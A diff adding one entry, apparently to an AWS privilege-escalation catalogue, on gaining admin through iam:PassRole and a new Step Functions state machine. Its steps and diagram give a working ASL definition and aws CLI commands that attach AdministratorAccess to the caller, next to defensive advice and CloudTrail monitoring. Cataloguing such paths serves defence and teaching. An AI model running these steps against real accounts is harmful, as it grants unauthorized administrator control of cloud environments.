@@ -1,0 +1,249 @@
+id: stepfunctions-001
+name: iam:PassRole + states:CreateStateMachine + states:StartExecution
+category: new-passrole
+services:
+  - iam
+  - stepfunctions
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role to the Step Functions service
+    - permission: states:CreateStateMachine
+      resourceConstraints: No resource constraints required
+    - permission: states:StartExecution
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: states:DescribeExecution
+      resourceConstraints: Useful for polling execution status to confirm the attack succeeded
+    - permission: states:DescribeStateMachine
+      resourceConstraints: Useful for verifying the state machine was created with the correct definition
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `states:CreateStateMachine`, and `states:StartExecution` can escalate privileges by creating a Step Functions state machine that uses an admin IAM role and contains an ASL (Amazon States Language) definition with an SDK integration step that calls `iam:AttachUserPolicy`. Starting an execution causes Step Functions to run the definition as the passed admin role, attaching AdministratorAccess to the starting user.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts states.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - A role must exist that trusts states.amazonaws.com and has elevated permissions
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/sfn-privesc-def.json << 'EOF'
+        {
+          "Comment": "Privilege escalation via Step Functions SDK integration",
+          "StartAt": "AttachAdminPolicy",
+          "States": {
+            "AttachAdminPolicy": {
+              "Type": "Task",
+              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
+              "Parameters": {
+                "UserName": "STARTING_USER",
+                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+              },
+              "End": true
+            }
+          }
+        }
+        EOF
+      description: Create the malicious ASL definition. The state machine uses the Step Functions SDK integration to call iam:AttachUserPolicy directly — no Lambda function required.
+    - step: 2
+      command: |
+        aws stepfunctions create-state-machine \
+          --name privesc-sfn \
+          --definition file:///tmp/sfn-privesc-def.json \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --type STANDARD
+      description: Create the state machine, passing the admin role via iam:PassRole. Step Functions will use this role when executing the state machine definition.
+    - step: 3
+      command: |
+        aws stepfunctions start-execution \
+          --state-machine-arn STATE_MACHINE_ARN
+      description: Start an execution of the state machine. Step Functions runs as the admin role and calls iam:AttachUserPolicy, granting AdministratorAccess to the starting user.
+    - step: 4
+      command: |
+        aws stepfunctions describe-execution \
+          --execution-arn EXECUTION_ARN \
+          --query 'status' \
+          --output text
+      description: Poll execution status until it reaches SUCCEEDED, confirming the privilege escalation has completed.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative Step Functions roles** - Very rarely does a state machine need administrative access. Use the principle of least privilege and scope state machine roles to only the specific AWS APIs the state machine legitimately calls.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificStepFunctionsRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "states.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Restrict `states:CreateStateMachine`** - This permission lets any holder define arbitrary state machine workflows with any role. Restrict it to trusted CI/CD principals only.
+  - Monitor CloudTrail for unusual state machine creation followed by immediate execution
+  - Monitor CloudTrail for state machine creation by principals who do not usually create state machines
+  - Monitor CloudTrail for roles being passed to Step Functions that haven't been used before
+  - Monitor and alert on state machine creation with privileged roles
+  - Regularly audit state machines for excessive IAM permissions on their execution roles
+  - Regularly audit all IAM roles that trust states.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Zander Mackie
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS Step Functions - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsstepfunctions.html"
+  - title: "Creating an IAM role for your state machine - AWS Step Functions"
+    url: "https://docs.aws.amazon.com/step-functions/latest/dg/procedure-create-iam-role.html"
+
+relatedPaths:
+  - stepfunctions-002
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/stepfunctions-001-iam-passrole+states-createstatemachine+states-startexecution"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole`, `states:CreateStateMachine`, and `states:StartExecution` permissions. Can be an IAM user or role.
+
+    - id: state_machine
+      label: New Step Functions State Machine
+      type: resource
+      description: |
+        A new state machine created with a malicious ASL (Amazon States Language) definition. The definition contains a Task state using a Step Functions SDK integration that calls `iam:AttachUserPolicy` directly — no Lambda function required. The state machine is passed the admin role via `iam:PassRole` at creation time, so every execution runs under that role's identity.
+
+        Example malicious ASL definition:
+        ```json
+        {
+          "Comment": "Privilege escalation via Step Functions SDK integration",
+          "StartAt": "AttachAdminPolicy",
+          "States": {
+            "AttachAdminPolicy": {
+              "Type": "Task",
+              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
+              "Parameters": {
+                "UserName": "STARTING_USER",
+                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+              },
+              "End": true
+            }
+          }
+        }
+        ```
+
+    - id: admin_role
+      label: Admin Role (Passed to State Machine)
+      type: principal
+      description: The IAM role passed to the state machine via `iam:PassRole`. Must have a trust policy allowing `states.amazonaws.com` to assume it. Every state machine execution assumes this role, meaning any SDK integration calls in the ASL definition are made using this role's permissions.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: The passed role has AdministratorAccess or equivalent permissions. The state machine execution successfully calls `iam:AttachUserPolicy`, attaching AdministratorAccess to the starting user.
+
+    - id: some_perms
+      label: Elevated Access
+      type: outcome
+      color: '#ffeb99'
+      description: The passed role has elevated permissions but not full admin. The attacker can craft ASL definitions that leverage those specific permissions — for example, reading secrets, exfiltrating S3 data, or creating resources — but cannot directly attach administrator policies.
+
+    - id: no_perms
+      label: Minimal Access
+      type: outcome
+      color: '#cccccc'
+      description: The passed role has only minimal permissions. The state machine execution may succeed but accomplishes nothing useful for privilege escalation. The attacker gains no meaningful additional access.
+
+  edges:
+    - from: start
+      to: state_machine
+      label: iam:PassRole + states:CreateStateMachine + states:StartExecution
+      description: |
+        Create the malicious state machine and immediately start an execution. The `iam:PassRole` permission is exercised at creation time when specifying `--role-arn`.
+
+        Step 1 — Write the malicious ASL definition:
+        ```bash
+        cat > /tmp/sfn-privesc-def.json << 'EOF'
+        {
+          "Comment": "Privilege escalation via Step Functions SDK integration",
+          "StartAt": "AttachAdminPolicy",
+          "States": {
+            "AttachAdminPolicy": {
+              "Type": "Task",
+              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
+              "Parameters": {
+                "UserName": "STARTING_USER",
+                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+              },
+              "End": true
+            }
+          }
+        }
+        EOF
+        ```
+
+        Step 2 — Create the state machine, passing the admin role:
+        ```bash
+        aws stepfunctions create-state-machine \
+          --name privesc-sfn \
+          --definition file:///tmp/sfn-privesc-def.json \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --type STANDARD
+        ```
+
+        Step 3 — Start an execution:
+        ```bash
+        aws stepfunctions start-execution \
+          --state-machine-arn STATE_MACHINE_ARN
+        ```
+
+    - from: state_machine
+      to: admin_role
+      label: State machine assumes admin role (SDK integration)
+      description: When `states:StartExecution` triggers an execution, Step Functions runs each state using the role attached to the state machine. The SDK integration task (`arn:aws:states:::aws-sdk:iam:attachUserPolicy`) is executed as the admin role, so the resulting IAM API call carries the admin role's permissions.
+
+    - from: admin_role
+      to: admin_outcome
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: If the passed role has AdministratorAccess or at minimum `iam:AttachUserPolicy`, the SDK integration call succeeds and AdministratorAccess is attached to the starting user. The attacker now has full administrative access.
+
+    - from: admin_role
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the passed role has elevated permissions but lacks IAM write access, the `iam:AttachUserPolicy` SDK integration call fails. However, the attacker can redesign the ASL definition to call other APIs the role does have access to — S3 read, Secrets Manager, EC2, etc. — and achieve partial escalation or data exfiltration.
+
+    - from: admin_role
+      to: no_perms
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the passed role has only minimal permissions (e.g., `logs:PutLogEvents`), neither the `iam:AttachUserPolicy` call nor alternative SDK integrations provide meaningful access. The privilege escalation yields no useful gain.
